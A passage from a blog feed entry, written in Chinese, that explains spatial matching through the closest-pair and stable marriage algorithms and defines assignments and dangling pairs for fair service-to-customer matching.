pair&#x2F;最近点对算法</h4><p>即平面最近点问题，要么使用暴力朴素算法枚举所有点对，然后记录最小的点对距离；要么运用分治法从中间开始匹配（匹配前需要对横坐标进行排序）</p><p>在刚刚的住宅区和投票池例子中，即针对o<del>i</del>一个个寻找与他距离最近的p<del>i</del>。首先是(p<del>1</del>,o<del>1</del>)，随后o<del>1</del>被移出集合O；然后是(p<del>1</del>,o<del>2</del>)，再把o<del>2</del>移出集合O，此时p<del>1</del>也将被移出集合P（因为p<del>1</del>达到了服务人数上限）；最后再根据距离最短匹配原则，即(p<del>2</del>,o<del>3</del>)。</p><h4 id="stable-marriage-稳定婚姻算法"><a href="#stable-marriage-稳定婚姻算法" class="headerlink" title="stable marriage&#x2F;稳定婚姻算法"></a>stable marriage&#x2F;稳定婚姻算法</h4><p>稳定婚姻算法是一个很有意思的问题。它假设当前有N位男生和N位女生，开始之前每个男女生都对自己心怡的异性进行排名。男生和女生结婚后，对于每一对男生女生，不会出现比起当前匹配的伴侣互相更喜爱的一对男生女生，即可认为婚姻是稳定的。</p><p>这个问题十分的有意思，尤其是结论令人咂舌：传统的求爱，结婚过程是male-optimal的，也就是说，男性能够得到尽可能好的心上人，女性却不然。</p><p>在此附上这个问题的链接，有兴趣可以自行阅读。<a href="https://baike.baidu.com/item/%E7%A8%B3%E5%AE%9A%E5%A9%9A%E5%A7%BB%E9%97%AE%E9%A2%98/12760040">稳定婚姻问题_百度百科 (baidu.com)</a></p><p>话扯远了，那么如何运用稳定婚姻算法来解释SPM的工作机制呢？其实也很简单。</p><p>对于o<del>i</del>和p<del>i</del>，假定每一个元素都以距离为标准给非同集元素进行降序排序。那么很显然，对于o<del>1</del>o<del>2</del>o<del>3</del>来说，它们的排序表都是{p<del>1</del>,p<del>2</del>,p<del>3</del>}。然而，对于p<del>1</del>来说，排序是{o<del>1</del>,o<del>2</del>,o<del>3</del>}，p<del>2</del>p<del>3</del>则是{o<del>3</del>,o<del>2</del>,o<del>1</del>}，根据这个表，stable marriage能返回一个最稳定的配对并确保没有住宅地和投票池更加偏向于其他组合。当然与经典婚姻匹配不一致的是，这个例子中投票池和住宅地并不是一一对应的关系，即一个投票池可以在不超过承载能力上限的情况下容纳几个住宅地。</p><h2 id="基本定义和属性"><a href="#基本定义和属性" class="headerlink" title="基本定义和属性"></a>基本定义和属性</h2><p>定义D为一个平面空间，并且满足三角不等式|a,b|+|b,c|&gt;&#x3D;|a,c|。定义集合P为平面D中的一系列对象，每一个对象代表一个服务端（service-site），再定义一系列对象为O，其中的对象代表客户端（custom-site）。对于每一个客户端o∈O，定义o.w来表示它的人数，也就是客户端的客户数量。同样的p.w代表它的服务容量，代表p所能够服务的最大人数。我们假设有足够的服务设施，即：</p><p>$$\sum_{p \in P} p . w \geq \sum_{o \in O} o . w$$</p><p>为了方便起见，我们先给出定义的不加权版本。</p><h3 id="不加权空间匹配技术"><a href="#不加权空间匹配技术" class="headerlink" title="不加权空间匹配技术"></a>不加权空间匹配技术</h3><p>在不加权版本，我们假定每一个o.w和p.w都为1。</p><h4 id="定义一-分配-Assignment"><a href="#定义一-分配-Assignment" class="headerlink" title="定义一 分配&#x2F;Assignment"></a>定义一 分配&#x2F;Assignment</h4><p>我们定义A为P×O的一个笛卡尔子集，每一个对象配对称为<strong>对象对（couple）</strong>。在对象对中，两个对象互为彼此的<strong>搭档（partner）</strong>。那么A就被称为<strong>分配（Assignment）</strong>。在A中，每一个o∈O都在且仅在一个对象对中，而每一个p∈P都最多只出现在一个对象对中。</p><p>我们在分配中寻找一个公平的分配，每一个客户端都和离它最近的服务端配对且不存在最近服务端被其他客户端所占据的情况。</p><h4 id="定义二-悬空对-Dangling-Pair"><a href="#定义二-悬空对-Dangling-Pair" class="headerlink" title="定义二 悬空对&#x2F;Dangling Pair"></a>定义二 悬空对&#x2F;Dangling Pair</h4><p>当且仅当满足以下条件时，分配A中的一对对象对（p,o）为悬空对：</p><ul><li>存在p，|p,o|&lt;在A中o和它对应搭档的距离</li><li>存在o，|p,o|&lt;在A中p和它对应搭档的距离（如果这个p在A中还没有搭档那么显然成立）</li></ul><p>如果A中没有悬空对，那么我们称A是<strong>公平（fair）</strong>的，否则A是<strong>不公平（unfair）</strong>的。</p><hr><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300590.jpg" alt="300590"></p>]]></content>
    
    
    <summary type="html">一个和隐私保护计算有重要关系的机制</summary>
    
    
    
    <category term="隐私保护计算" scheme="http://example.com/categories/%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E8%AE%A1%E7%AE%97/"/>
    
    
    <category term="Spatial Matching" scheme="http://example.com/tags/Spatial-Matching/"/>
    
  </entry>
  
</feed>
